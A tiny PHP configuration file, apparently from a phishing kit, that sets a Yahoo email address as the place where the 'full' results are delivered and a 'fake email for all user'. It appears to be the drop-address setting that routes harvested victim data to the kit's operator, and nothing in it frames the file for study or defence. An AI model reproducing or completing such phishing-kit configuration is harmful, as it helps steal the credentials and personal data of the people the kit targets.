<?
$okman="rickyanmeldemail@yahoo.com"; // here u`ll get full ( 1nd mail ) 
$mailusers = 'rickyanmeldemail@yahoo.com'; // fake email for all user

?>
